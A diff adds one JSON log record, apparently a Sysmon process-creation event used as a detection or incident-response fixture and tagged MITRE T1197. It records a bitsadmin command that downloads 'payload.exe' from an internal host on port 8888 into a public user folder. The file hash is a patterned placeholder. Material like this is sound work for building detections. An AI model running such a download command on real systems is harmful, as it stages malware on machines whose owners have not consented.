@@ -1,0 +1,14 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-06-17T14:22:15.332Z",
+  "Hostname": "WKSTN-042",
+  "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+  "CommandLine": "bitsadmin /transfer debjob /download /priority foreground http://10.10.30.10:8888/file/download C:\\Users\\Public\\payload.exe",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "ParentCommandLine": "cmd.exe /c bitsadmin /transfer debjob /download /priority foreground http://10.10.30.10:8888/file/download C:\\Users\\Public\\payload.exe",
+  "User": "CORP\\jsmith",
+  "IntegrityLevel": "Medium",
+  "Hashes": "SHA256=A3F2B8C1D4E5F678901234567890ABCD1234567890ABCDEF1234567890ABCD12",
+  "mitre_technique": "T1197",
+  "incident_id": "INC-2026-001"
+}
